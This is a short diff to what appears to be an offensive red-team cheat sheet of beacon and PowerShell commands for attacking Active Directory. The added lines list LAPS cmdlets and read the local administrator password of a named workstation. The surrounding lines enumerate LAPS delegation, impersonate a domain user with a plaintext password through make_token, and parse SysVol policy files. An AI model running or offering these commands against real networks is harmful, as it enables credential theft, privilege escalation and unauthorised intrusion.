@@ -118,6 +118,8 @@ powershell Get-DomainGPO -Identity "*LAPS*"
 powershell-import C:\Users\Commando\Desktop\Weapon\LAPSToolkit.ps1
 powershell Get-LAPSComputers 
 powershell Find-LAPSDelegatedGroups
+powershell Get-Command *AdmPwd*
+powershell Get-AdmPwdPassword -ComputerName wkstn-1921 | fl
 make_token MeMe 123456qWE
 make_token insomnia.io\MeMe 123456qWE
 Parse-PolFile "\\testlab.local\SysVol\testlab.local\Policies\{C3801BA8-56D9-4F54-B2BD-FE3BF1A71BAA}\Machine\Registry.pol"
